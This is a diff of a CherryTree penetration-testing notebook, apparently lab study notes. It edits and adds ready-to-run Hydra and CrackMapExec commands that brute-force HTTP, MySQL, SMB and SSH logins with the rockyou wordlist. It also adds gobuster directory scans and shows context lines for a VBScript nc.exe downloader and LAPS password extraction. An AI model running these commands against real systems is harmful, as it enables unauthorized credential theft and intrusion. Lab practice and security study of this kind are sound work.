@@ -129,7 +129,7 @@ Exploit POC:</rich_text>
       <rich_text link="node 32">ssh</rich_text>
       <node name="Brute Force" unique_id="57" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1687690684">
         <rich_text> </rich_text>
-        <node name="Hydra" unique_id="58" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1687690629">
+        <node name="Hydra" unique_id="58" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1689800025">
           <rich_text underline="single" scale="h1">Hydra</rich_text>
           <rich_text>
 
@@ -139,7 +139,7 @@ Exploit POC:</rich_text>
           <rich_text underline="single" scale="h2">HTTP Basic Authentication</rich_text>
           <rich_text>
 </rich_text>
-          <rich_text family="monospace">hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.0.1 http-get /phpmyadmin/ -t 15</rich_text>
+          <rich_text family="monospace">hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 10.11.1. http-get /phpmyadmin/ -t 15</rich_text>
           <rich_text>
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -148,7 +148,7 @@ Exploit POC:</rich_text>
           <rich_text underline="single" scale="h2">HTTP Get Request</rich_text>
           <rich_text>
 </rich_text>
-          <rich_text family="monospace">hydra 192.168.0.1 -V -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&amp;password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t 15</rich_text>
+          <rich_text family="monospace">hydra 10.11.1. -V -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&amp;password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t 15</rich_text>
           <rich_text>
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -163,7 +163,7 @@ Check request in BURP to see Post parameters. -l or -L has to be set, even if th
           <rich_text> for HTTPS sites.
 
 </rich_text>
-          <rich_text family="monospace">hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-post-form "/webapp/login.php:username=^USER^&amp;password=^PASS^:Invalid" -t 15</rich_text>
+          <rich_text family="monospace">hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.1. http-post-form "/webapp/login.php:username=^USER^&amp;password=^PASS^:Invalid" -t 15</rich_text>
           <rich_text>
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -174,10 +174,24 @@ Check request in BURP to see Post parameters. -l or -L has to be set, even if th
 Change MYDATABASENAME. Default databasename is mysql.
 
 </rich_text>
-          <rich_text family="monospace">hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv  mysql://192.168.0.1:3306/MYDATABASENAME -t 15</rich_text>
+          <rich_text family="monospace">hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv  mysql://10.11.1.:3306/MYDATABASENAME -t 15</rich_text>
           <rich_text>
 
+_______________________________________
+
+
+SSH
+
 </rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+or if that doesnt work
+
+</rich_text>
+          <codebox char_offset="1091" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://10.11.1.</codebox>
+          <codebox char_offset="1118" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ssh 10.11.1. -u patrick -p /usr/share/wordlists/rockyou.txt
+</codebox>
         </node>
       </node>
       <node name="Shells" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687691258">
@@ -1146,7 +1160,7 @@ echo ts.Close </rich_text>
           <rich_text family="monospace">cscript wget.vbs http://192.168.0.1/nc.exe nc.exe</rich_text>
         </node>
       </node>
-      <node name="gobuster" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684772533" ts_lastsave="1689625556">
+      <node name="gobuster" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684772533" ts_lastsave="1689625596">
         <rich_text scale="h1">Directory BF
 </rich_text>
         <rich_text>
@@ -1178,9 +1192,13 @@ echo ts.Close </rich_text>
 
 _______________________________________
 
-Using Proxy:
-
-
+</rich_text>
+        <rich_text scale="h2">Using Proxy:
+</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 
 
@@ -1196,7 +1214,7 @@ To ignore ssl certificate use </rich_text>
         <codebox char_offset="38" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.11.1. -w /usr/share/wordlists/dirb/big.txt -t 20 -o gobuster.log</codebox>
         <codebox char_offset="64" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.11.1. -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log</codebox>
         <codebox char_offset="103" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.11.1. -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20 -o gobuster.log</codebox>
-        <codebox char_offset="161" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">10.11.1.</codebox>
+        <codebox char_offset="161" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir --proxy http://10.11.1.:3128 -e -u http://10.11.1. -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log</codebox>
       </node>
       <node name="ssh" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684867617" ts_lastsave="1687291548">
         <rich_text scale="h2">SSH</rich_text>
@@ -1866,7 +1884,7 @@ whoami&#13;
 nt authority\system</codebox>
           </node>
         </node>
-        <node name="CrackMapExec" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689718" ts_lastsave="1688935332">
+        <node name="CrackMapExec" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689718" ts_lastsave="1689800120">
           <rich_text scale="h3">Enumerating smb via crackmapexec</rich_text>
           <rich_text>
 
@@ -1966,6 +1984,16 @@ Grabbing the Laps password
 
 </rich_text>
           <rich_text justification="left"></rich_text>
+          <rich_text>
+
+______________________________
+
+
+</rich_text>
+          <rich_text scale="h2">SSH Brute Force</rich_text>
+          <rich_text>
+
+</rich_text>
           <codebox char_offset="34" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1.</codebox>
           <codebox char_offset="88" justification="left" frame_width="962" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1. -u &lt;username&gt; -p &lt;password&gt; --shares
 
@@ -1987,6 +2015,7 @@ crackmapexec smb 10.11.1. -u admin -p abcd1234 --shares</codebox>
           <codebox char_offset="441" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">  crackmapexec smb 10.11.1.  -u validuser.txt -p password.txt -M spider-plus --no-bruteforce</codebox>
           <codebox char_offset="502" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1.  -u validuser.txt -p password.txt -M spider-plus --continue-on-success</codebox>
           <codebox char_offset="605" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ldap 10.11.1. -u &lt;username&gt; -p &lt;password&gt; --kdcHost 10.11.1. -M laps</codebox>
+          <codebox char_offset="658" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ssh 192.168.238.39 -u patrick -p /usr/share/wordlists/rockyou.txt</codebox>
         </node>
         <node name="Using Bloodhound" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690408" ts_lastsave="1688916050">
           <rich_text scale="h3">Upload sharphound and run the following if u are on a non domain joined system in powershell</rich_text>
